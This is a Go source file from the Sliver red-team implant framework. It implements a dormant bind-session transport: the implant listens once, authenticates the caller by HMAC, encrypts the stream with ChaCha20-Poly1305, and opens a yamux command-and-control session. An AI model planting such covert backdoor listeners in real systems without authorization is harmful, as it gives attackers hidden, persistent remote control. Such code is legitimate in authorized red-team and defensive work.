package transports

/*
	Sliver Implant Framework
	Copyright (C) 2026  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.

	------------------------------------------------------------------------

	Bind session transport: accepts an inbound TCP (or KCP) connection
	on an already-opened listener and establishes a full Sliver session
	using yamux + signed envelopes — the same wire protocol as mTLS.

	Security layers (applied before yamux):
	  1. HMAC-SHA256 challenge-response (shared secret from trigger)
	  2. ChaCha20-Poly1305 stream encryption (key derived from secret + nonce)

	The encrypted stream is transparent to yamux and the envelope layer.

	Fallback: if the auth handshake fails (e.g., nc/socat connects
	without the shared secret), the connection is dropped immediately.
*/

// {{if .Config.IncludeTriggerWake}}

import (
	"crypto/cipher"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"net/url"
	"sync"
	"time"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/bishopfox/sliver/implant/sliver/transports/envelope"
	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/hashicorp/yamux"
	"golang.org/x/crypto/chacha20poly1305"
)

const bindSessionKeyLabel = "bind-session-v1"

// BindSessionConnect accepts a single connection on the provided
// listener, performs the HMAC auth handshake, wraps the connection
// in ChaCha20-Poly1305 encryption, and establishes a full Sliver
// session via yamux + signed envelopes.
//
// The listener is closed after the first connection is accepted
// (single-use). The listener may have a TTL deadline set by the
// triggerwake handler — if Accept() times out, the bind port
// closes and the implant goes dormant.
//
// Returns nil if auth fails (scanner) or Accept() times out.
// The caller is responsible for calling connection.Cleanup() when done.
func BindSessionConnect(ln net.Listener, secret []byte) (*Connection, error) {
	// {{if .Config.Debug}}
	log.Printf("[bind] waiting for connection on %s", ln.Addr())
	// {{end}}

	conn, err := ln.Accept()
	if err != nil {
		_ = ln.Close()
		// {{if .Config.Debug}}
		log.Printf("[bind] accept failed (TTL expired or error): %v", err)
		// {{end}}
		return nil, err
	}
	// Single-use: close the listener immediately.
	_ = ln.Close()

	// {{if .Config.Debug}}
	log.Printf("[bind] accepted connection from %s, starting auth handshake", conn.RemoteAddr())
	// {{end}}

	// --- Auth handshake (server side) ---
	// Generate 32-byte random nonce and send it.
	nonce := make([]byte, 32)
	if _, err := rand.Read(nonce); err != nil {
		conn.Close()
		return nil, fmt.Errorf("bind: generate nonce: %w", err)
	}

	// Set a deadline for the handshake — don't wait forever for auth.
	_ = conn.SetDeadline(time.Now().Add(10 * time.Second))

	if _, err := conn.Write(nonce); err != nil {
		conn.Close()
		return nil, fmt.Errorf("bind: send nonce: %w", err)
	}

	// Read 32-byte HMAC response.
	response := make([]byte, 32)
	if _, err := io.ReadFull(conn, response); err != nil {
		// {{if .Config.Debug}}
		log.Printf("[bind] auth: failed to read HMAC from %s (scanner?): %v", conn.RemoteAddr(), err)
		// {{end}}
		conn.Close()
		return nil, fmt.Errorf("bind: read auth response: %w", err)
	}

	// Verify HMAC-SHA256(nonce, secret) — constant-time comparison.
	mac := hmac.New(sha256.New, secret)
	mac.Write(nonce)
	expected := mac.Sum(nil)
	if !hmac.Equal(response, expected) {
		// {{if .Config.Debug}}
		log.Printf("[bind] auth FAILED from %s — wrong shared secret", conn.RemoteAddr())
		// {{end}}
		conn.Close()
		return nil, fmt.Errorf("bind: authentication failed")
	}

	// Clear the handshake deadline — session has no timeout.
	_ = conn.SetDeadline(time.Time{})

	// {{if .Config.Debug}}
	log.Printf("[bind] auth OK from %s, establishing encrypted session", conn.RemoteAddr())
	// {{end}}

	// --- Derive encryption key and wrap connection ---
	aead, err := bindDeriveAEAD(secret, nonce)
	if err != nil {
		conn.Close()
		return nil, fmt.Errorf("bind: derive key: %w", err)
	}

	// isServer=true: the implant is the "server" (it listens).
	// Server writes use even seq (0,2,4,...), client reads use even.
	encConn := newBindEncryptedConn(conn, aead, true)

	return bindYamuxSession(encConn)
}

// --- Bind crypto primitives (implant side) ---

func bindDeriveAEAD(secret, nonce []byte) (cipher.AEAD, error) {
	h := sha256.New()
	h.Write(secret)
	h.Write(nonce)
	h.Write([]byte(bindSessionKeyLabel))
	key := h.Sum(nil)
	return chacha20poly1305.New(key)
}

// bindEncryptedConn wraps a net.Conn with ChaCha20-Poly1305 framing.
// Frame format: [4-byte LE length of ciphertext] [ciphertext]
// Nonce: 12-byte counter. Server (implant) writes use even seq (0,2,4,...),
// client writes use odd seq (1,3,5,...) to avoid nonce collision.
type bindEncryptedConn struct {
	net.Conn
	aead     cipher.AEAD
	readBuf  []byte
	readMu   sync.Mutex
	writeMu  sync.Mutex
	readSeq  uint64
	writeSeq uint64
}

func newBindEncryptedConn(conn net.Conn, aead cipher.AEAD, isServer bool) *bindEncryptedConn {
	ec := &bindEncryptedConn{Conn: conn, aead: aead}
	if isServer {
		ec.writeSeq = 0 // server writes even
		ec.readSeq = 1  // reads client's odd
	} else {
		ec.writeSeq = 1 // client writes odd
		ec.readSeq = 0  // reads server's even
	}
	return ec
}

func bindNonceFromSeq(seq uint64) []byte {
	nonce := make([]byte, chacha20poly1305.NonceSize) // 12 bytes
	binary.LittleEndian.PutUint64(nonce[:8], seq)
	return nonce
}

func (c *bindEncryptedConn) Read(p []byte) (int, error) {
	c.readMu.Lock()
	defer c.readMu.Unlock()

	if len(c.readBuf) > 0 {
		n := copy(p, c.readBuf)
		c.readBuf = c.readBuf[n:]
		return n, nil
	}

	var lengthBuf [4]byte
	if _, err := io.ReadFull(c.Conn, lengthBuf[:]); err != nil {
		return 0, err
	}
	ctLen := binary.LittleEndian.Uint32(lengthBuf[:])
	if ctLen == 0 || ctLen > 4*1024*1024 {
		return 0, fmt.Errorf("bind: invalid frame length %d", ctLen)
	}

	ct := make([]byte, ctLen)
	if _, err := io.ReadFull(c.Conn, ct); err != nil {
		return 0, err
	}

	nonce := bindNonceFromSeq(c.readSeq)
	c.readSeq += 2

	plaintext, err := c.aead.Open(nil, nonce, ct, nil)
	if err != nil {
		return 0, fmt.Errorf("bind: decrypt failed: %w", err)
	}

	n := copy(p, plaintext)
	if n < len(plaintext) {
		c.readBuf = plaintext[n:]
	}
	return n, nil
}

func (c *bindEncryptedConn) Write(p []byte) (int, error) {
	c.writeMu.Lock()
	defer c.writeMu.Unlock()

	nonce := bindNonceFromSeq(c.writeSeq)
	c.writeSeq += 2

	ct := c.aead.Seal(nil, nonce, p, nil)

	var lengthBuf [4]byte
	binary.LittleEndian.PutUint32(lengthBuf[:], uint32(len(ct)))

	if _, err := c.Conn.Write(lengthBuf[:]); err != nil {
		return 0, err
	}
	if _, err := c.Conn.Write(ct); err != nil {
		return 0, err
	}
	return len(p), nil
}

// --- Yamux session setup ---

// bindYamuxSession sets up a yamux-multiplexed session over the
// (already authenticated + encrypted) connection and returns a
// Connection with Send/Recv channels. Pattern mirrors mtlsConnect.
func bindYamuxSession(conn net.Conn) (*Connection, error) {
	send := make(chan *pb.Envelope)
	recv := make(chan *pb.Envelope)
	ctrl := make(chan struct{})
	done := make(chan struct{})
	var muxSession *yamux.Session

	connection := &Connection{
		Send:    send,
		Recv:    recv,
		ctrl:    ctrl,
		tunnels: map[uint64]*Tunnel{},
		mutex:   &sync.RWMutex{},
		once:    &sync.Once{},
		IsOpen:  false,
		uri:     &url.URL{Scheme: "bind", Host: conn.RemoteAddr().String()},

		cleanup: func() {
			// {{if .Config.Debug}}
			log.Printf("[bind] connection cleanup")
			// {{end}}
			close(done)
			if muxSession != nil {
				muxSession.Close()
			}
			conn.Close()
			close(recv)
		},
	}

	connection.Stop = func() error {
		connection.Cleanup()
		return nil
	}

	connection.Start = func() error {
		// Write yamux preface. The implant is always yamux.Client
		// (same role as mTLS, regardless of TCP direction).
		if _, err := conn.Write([]byte(envelope.YamuxPreface)); err != nil {
			conn.Close()
			return err
		}

		cfg := yamux.DefaultConfig()
		cfg.Logger = nil
		cfg.LogOutput = io.Discard
		// {{if .Config.Debug}}
		cfg.Logger = log.Default()
		cfg.LogOutput = nil
		// {{end}}

		var err error
		muxSession, err = yamux.Client(conn, cfg)
		if err != nil {
			conn.Close()
			return err
		}
		connection.IsOpen = true

		// Send loop
		go func() {
			defer connection.Cleanup()
			sendSem := make(chan struct{}, 64)
			ticker := time.NewTicker(envelope.PingInterval)
			defer ticker.Stop()

			sendEnvelope := func(env *pb.Envelope) {
				if env == nil {
					return
				}
				select {
				case sendSem <- struct{}{}:
				case <-done:
					return
				}
				go func(env *pb.Envelope) {
					defer func() { <-sendSem }()
					stream, err := muxSession.Open()
					if err != nil {
						connection.Cleanup()
						return
					}
					defer stream.Close()
					if err := envelope.WriteEnvelope(stream, env); err != nil {
						connection.Cleanup()
						return
					}
				}(env)
			}

			sendPing := func() {
				select {
				case sendSem <- struct{}{}:
				case <-done:
					return
				}
				go func() {
					defer func() { <-sendSem }()
					stream, err := muxSession.Open()
					if err != nil {
						connection.Cleanup()
						return
					}
					defer stream.Close()
					if err := envelope.WritePing(stream); err != nil {
						connection.Cleanup()
						return
					}
				}()
			}

			for {
				select {
				case env, ok := <-send:
					if !ok {
						return
					}
					sendEnvelope(env)
				case <-ticker.C:
					sendPing()
				case <-done:
					return
				}
			}
		}()

		// Recv loop
		go func() {
			defer connection.Cleanup()
			streamSem := make(chan struct{}, 128)
			for {
				stream, err := muxSession.Accept()
				if err != nil {
					return
				}
				select {
				case streamSem <- struct{}{}:
				case <-done:
					stream.Close()
					return
				}
				go func() {
					defer func() { <-streamSem }()
					defer stream.Close()
					env, err := envelope.ReadEnvelope(stream)
					if err != nil {
						return
					}
					if env != nil {
						select {
						case recv <- env:
						case <-done:
						}
					}
				}()
			}
		}()

		return nil
	}

	return connection, nil
}

// {{end}} -IncludeTriggerWake
